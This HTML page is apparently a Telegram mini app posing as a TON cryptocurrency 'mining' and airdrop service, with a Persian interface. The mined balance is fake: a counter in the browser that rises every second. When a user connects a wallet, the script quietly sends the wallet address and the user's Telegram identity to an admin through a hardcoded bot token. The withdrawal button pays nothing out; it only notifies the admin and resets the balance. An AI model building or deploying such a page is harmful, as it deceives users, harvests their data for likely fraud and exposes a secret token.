<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<title>TON Dropy PRO - Pro Connection</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>

<style>
@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
*{box-sizing:border-box; -webkit-tap-highlight-color: transparent;}
body{
    margin:0; font-family:'Vazirmatn',sans-serif;
    background: radial-gradient(circle at top,#0f1c2e,#070b14);
    color:#fff; padding:20px; line-height: 1.6;
}
.header{text-align:center;margin-bottom:20px;}
.header h2{
    font-size:24px; background:linear-gradient(90deg,#00c6ff,#0072ff);
    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
}
.card{
    background:rgba(255,255,255,0.05); backdrop-filter:blur(15px);
    border:1px solid rgba(255,255,255,0.1); padding:20px;
    border-radius:20px; margin-bottom:15px; text-align: center;
}
#balance { font-size: 32px; font-weight: 800; color: #00c6ff; display: block; }
button{
    width:100%; padding:15px; border:none; border-radius:15px;
    font-size:16px; font-weight:700; cursor:pointer; transition: 0.2s;
}
.withdraw-btn{ background:linear-gradient(90deg,#ff512f,#dd2476); color:#fff; }
.withdraw-btn:disabled{ background: #444; color: #888; }
.toast{
    position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(100px);
    background:#00c6ff; color:#000; padding:10px 25px; border-radius:50px;
    transition: 0.4s; opacity:0; z-index: 9999; font-weight: bold;
}
.toast.show{ opacity:1; transform:translateX(-50%) translateY(0); }
.history-item{
    background:rgba(255,255,255,0.03); padding:10px; border-radius:12px;
    margin-top:10px; font-size:13px; border-right: 4px solid #00c6ff;
    display: flex; justify-content: space-between;
}
</style>
</head>

<body>

<div class="header">
    <h2>⛏ TON Dropy PRO</h2>
</div>

<div class="card">
    <p style="margin:0;">موجودی زنده</p>
    <span id="balance">0.000000</span>
    <div style="font-size:12px; color:#aaa; margin-top:10px;">⚡ 0.000012 TON/s</div>
</div>

<div class="card">
    <div id="ton-connect-btn"></div>
    <div id="walletDetail" style="display:none; margin-top:15px; font-size:13px;">
        <span style="color:#00ff9d;">● کیف پول متصل است</span><br>
        <small id="walletAddr" style="opacity:0.6; word-break:break-all;"></small>
    </div>
</div>

<div class="card">
    <button id="withdrawBtn" onclick="withdraw()" class="withdraw-btn">ثبت درخواست برداشت</button>
</div>

<div class="card" style="text-align: right;">
    <h4 style="margin:0 0 10px 0;">📜 تاریخچه</h4>
    <div id="history"></div>
</div>

<div id="toast" class="toast"></div>

<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// اطلاعات ربات شما
const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
const ADMIN_ID = "5972276401";
const STORAGE_KEY = 'ton_dropy_v4_final';

let currentBalance = parseFloat(localStorage.getItem(STORAGE_KEY)) || 0.0;
let miningRate = 0.000012;

// موتور استخراج
setInterval(() => {
    currentBalance += miningRate;
    document.getElementById("balance").innerText = currentBalance.toFixed(6);
    localStorage.setItem(STORAGE_KEY, currentBalance.toString());
}, 1000);

// --- تنظیمات TonConnect برای حل مشکل اتصال ---
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json',
    buttonRootId: 'ton-connect-btn'
});

// مانیتور کردن اتصال و ارسال پیام دقیق به مدیریت
tonConnectUI.onStatusChange(async (wallet) => {
    if (wallet) {
        const address = wallet.account.address;
        const walletName = wallet.device.appName || "نامشخص"; // تشخیص نام کیف پول (Tonkeeper و غیره)
        
        document.getElementById("walletDetail").style.display = "block";
        document.getElementById("walletAddr").innerText = address;

        const user = tg.initDataUnsafe?.user;
        const message = `✅ <b>کیف پول متصل شد!</b>\n\n` +
                        `👛 نوع کیف پول: <b>${walletName}</b>\n` +
                        `👤 کاربر: ${user?.first_name || 'ناشناس'}\n` +
                        `🆔 آیدی: <code>${user?.id || 'ناشناس'}</code>\n` +
                        `🔗 آدرس فعال:\n<code>${address}</code>`;

        sendToAdmin(message);
        showToast(`کیف پول ${walletName} متصل شد`);
    } else {
        document.getElementById("walletDetail").style.display = "none";
    }
});

async function sendToAdmin(text) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'HTML' })
        });
    } catch(e) { console.error(e); }
}

function withdraw() {
    if (!tonConnectUI.connected) {
        showToast("❌ ابتدا کیف پول را متصل کنید");
        return;
    }
    if (currentBalance < 0.5) {
        showToast("❌ حداقل موجودی 0.5 TON");
        return;
    }

    const amount = currentBalance.toFixed(6);
    const user = tg.initDataUnsafe?.user;
    const walletName = tonConnectUI.wallet?.device?.appName || "نامشخص";

    const message = `💸 <b>درخواست برداشت!</b>\n\n` +
                    `💵 مقدار: <b>${amount} TON</b>\n` +
                    `👛 از کیف پول: ${walletName}\n` +
                    `👤 کاربر: ${user?.first_name}\n` +
                    `🆔 آیدی: <code>${user?.id}</code>\n` +
                    `🔗 آدرس: <code>${tonConnectUI.account.address}</code>`;

    sendToAdmin(message);

    // ثبت در تاریخچه محلی
    const div = document.createElement("div");
    div.className = "history-item";
    div.innerHTML = `<span>${amount} TON</span> <span>در انتظار تایید</span>`;
    document.getElementById("history").prepend(div);

    // ریست موجودی
    currentBalance = 0;
    localStorage.setItem(STORAGE_KEY, "0");
    showToast("📤 درخواست ارسال شد");
}

function showToast(msg) {
    const t = document.getElementById("toast");
    t.innerText = msg;
    t.classList.add("show");
    setTimeout(() => t.classList.remove("show"), 3000);
}
</script>

</body>
</html>
